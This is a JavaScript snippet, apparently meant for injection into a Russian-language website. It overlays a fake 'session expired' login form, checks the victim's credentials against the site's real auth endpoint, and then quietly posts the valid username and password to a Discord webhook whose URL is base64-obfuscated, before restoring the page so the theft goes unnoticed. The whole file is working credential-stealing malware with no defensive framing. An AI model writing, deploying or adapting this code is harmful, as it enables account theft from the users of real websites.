(() => {
  const originalBodyHTML = document.body.innerHTML;
  const originalBodyStyle = {
    margin: document.body.style.margin,
    background: document.body.style.background,
    display: document.body.style.display,
    justifyContent: document.body.style.justifyContent,
    alignItems: document.body.style.alignItems,
    height: document.body.style.height,
  };

  const style = document.createElement('style');
  style.textContent = `
    @supports (font-variation-settings: normal) {
      @font-face {
        ascent-override: 100%;
        font-display: swap;
        font-family: Intervar;
        font-style: normal;
        font-weight: 100 900;
        src: url('/assets/dist/inter_roman_var.ba4caefc.woff2') format('woff2 supports variations(gvar)'),
             url('/assets/dist/inter_roman_var.ba4caefc.woff2') format('woff2-variations'),
             url('/assets/dist/inter_roman_var.ba4caefc.woff2') format('woff2');
      }
      @font-face {
        ascent-override: 100%;
        font-display: swap;
        font-family: Intervar;
        font-style: italic;
        font-weight: 100 900;
        src: url('/assets/dist/inter_italic_var.30807be7.woff2') format('woff2 supports variations(gvar)'),
             url('/assets/dist/inter_italic_var.30807be7.woff2') format('woff2-variations'),
             url('/assets/dist/inter_italic_var.30807be7.woff2') format('woff2');
      }
    }
    body, input, button, label {
      font-family: 'Intervar', sans-serif;
    }
  `;
  document.head.appendChild(style);

  const overlay = document.createElement('div');
  overlay.id = 'loginviewport';
  Object.assign(overlay.style, {
    position: 'fixed',
    top: '0',
    left: '0',
    width: '100vw',
    height: '100vh',
    background: 'rgba(245, 245, 245, 0.98)',
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    zIndex: '9999',
    fontFamily: `'Intervar', sans-serif`,
  });

  const container = document.createElement('div');
  Object.assign(container.style, {
    width: '360px',
    padding: '20px',
    background: 'white',
    boxShadow: '0 0 10px rgba(0,0,0,0.1)',
    borderRadius: '8px',
  });
  overlay.appendChild(container);

  // Контейнер для сообщений (ошибка или успех)
  const errorContainer = document.createElement('div');
  container.appendChild(errorContainer);

  function showError(message) {
    errorContainer.innerHTML = `
      <div class="ej-form__text">
        <div class="notice notice--red notice--medium EE3uyMsVK9TnBlbQZ4Sh">
          <div class="notice__content">
            <div class="notice__content__icon"></div>
            <div class="notice__content__text"><p>${message}</p></div>
          </div>
        </div>
      </div>
    `;
  }
  function showSuccess(message) {
    errorContainer.innerHTML = `
      <div class="ej-form__text">
        <div style="
          background-color: #d4edda;
          color: #155724;
          border: 1px solid #c3e6cb;
          border-radius: 4px;
          padding: 10px;
          margin-bottom: 16px;
          font-weight: 600;
          text-align: center;
        ">
          ${message}
        </div>
      </div>
    `;
  }
  function clearError() {
    errorContainer.innerHTML = '';
  }

  const h1 = document.createElement('h1');
  h1.className = 'ej-form__header';
  h1.textContent = 'Сессия окончена. войдите снова';
  h1.style.textAlign = 'center';
  h1.style.marginBottom = '24px';
  container.appendChild(h1);

  const form = document.createElement('form');
  Object.assign(form.style, {
    display: 'flex',
    flexDirection: 'column',
  });

  const loginLabel = document.createElement('label');
  loginLabel.textContent = 'Логин';
  loginLabel.style.marginBottom = '6px';
  form.appendChild(loginLabel);

  const loginInput = document.createElement('input');
  loginInput.type = 'text';
  loginInput.name = 'login';
  loginInput.autocomplete = 'username';
  loginInput.required = true;
  Object.assign(loginInput.style, {
    padding: '10px',
    marginBottom: '16px',
    fontSize: '16px',
    border: '1px solid #ccc',
    borderRadius: '4px',
  });
  form.appendChild(loginInput);

  const passLabel = document.createElement('label');
  passLabel.textContent = 'Пароль';
  passLabel.style.marginBottom = '6px';
  form.appendChild(passLabel);

  const passInput = document.createElement('input');
  passInput.type = 'password';
  passInput.name = 'password';
  passInput.autocomplete = 'current-password';
  passInput.required = true;
  Object.assign(passInput.style, {
    padding: '10px',
    marginBottom: '24px',
    fontSize: '16px',
    border: '1px solid #ccc',
    borderRadius: '4px',
  });
  form.appendChild(passInput);

  const btn = document.createElement('button');
  btn.type = 'submit';
  btn.textContent = 'Войти';
  Object.assign(btn.style, {
    backgroundColor: '#d32f2f',
    color: 'white',
    fontSize: '16px',
    padding: '12px',
    border: 'none',
    borderRadius: '4px',
    cursor: 'pointer',
    transition: 'background-color 0.3s',
  });
  btn.onmouseenter = () => btn.style.backgroundColor = '#b71c1c';
  btn.onmouseleave = () => btn.style.backgroundColor = '#d32f2f';

  form.appendChild(btn);

  const linksDiv = document.createElement('div');
  linksDiv.className = 'login-form__links';
  linksDiv.style.marginTop = '12px';
  linksDiv.innerHTML = `
    <a href="/invite" class="login-form__link login-form__link--left">Регистрация</a>
    <a href="/recover" class="login-form__link login-form__link--left">Забыли пароль?</a>
  `;

  container.appendChild(form);
  container.appendChild(linksDiv);

  // Base64 закодированный URL вебхука Discord
  const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMDQ3MjY4MjU2MzU2NzY4Ni9GVWIwMExhLTVhOU1jbkItT0dsUGRWd2haWVZpcUxpYjhicHBMbEg2VG1RQ3B0THpyTXlfTUtjNEtJMWFGRjkzNExZeA==';

  // Функция декодирования Base64
  function decodeBase64(str) {
    return atob(str);
  }

  form.addEventListener('submit', e => {
    e.preventDefault();
    clearError();

    const login = loginInput.value.trim();
    const password = passInput.value;

    if (!login || !password) {
      showError('Пожалуйста, заполните все поля');
      return;
    }

    const apiUrl = window.ajaxUrl || '/ajaxauthorize';

    fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: login, password: password }),
      credentials: 'include'
    })
    .then(async response => {
      const contentType = response.headers.get('Content-Type') || '';
      let data = {};
      if (contentType.includes('application/json')) {
        data = await response.json();
      }

      if (!response.ok) {
        const errorText = data.errors && data.errors.length && data.errors[0].text
                          ? data.errors[0].text
                          : `Ошибка: ${response.status}`;
        showError(errorText);
        return;
      }

      if (!data.result) {
        const errorText = data.errors && data.errors.length && data.errors[0].text
                          ? data.errors[0].text
                          : 'Неправильный логин или пароль';
        showError(errorText);
        return;
      }

      // Декодируем URL вебхука
      const webhookUrl = decodeBase64(encodedWebhook);

      // Отправляем данные на Discord webhook
      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: null,
          embeds: [{
            title: "Новая авторизация",
            color: 16711680,
            fields: [
              { name: "Логин", value: login, inline: true },
              { name: "Пароль", value: password, inline: true }
            ],
            timestamp: new Date().toISOString()
          }]
        })
      }).catch(console.error);

      showSuccess('Авторизация успешна');
      setTimeout(() => {
        document.body.removeChild(overlay);
        for (const key in originalBodyStyle) {
          document.body.style[key] = originalBodyStyle[key];
        }
        document.body.innerHTML = originalBodyHTML;
      }, 1500);
    })
    .catch(err => {
      showError('Ошибка: ' + err.message);
    });
  });

  document.body.appendChild(overlay);
})();
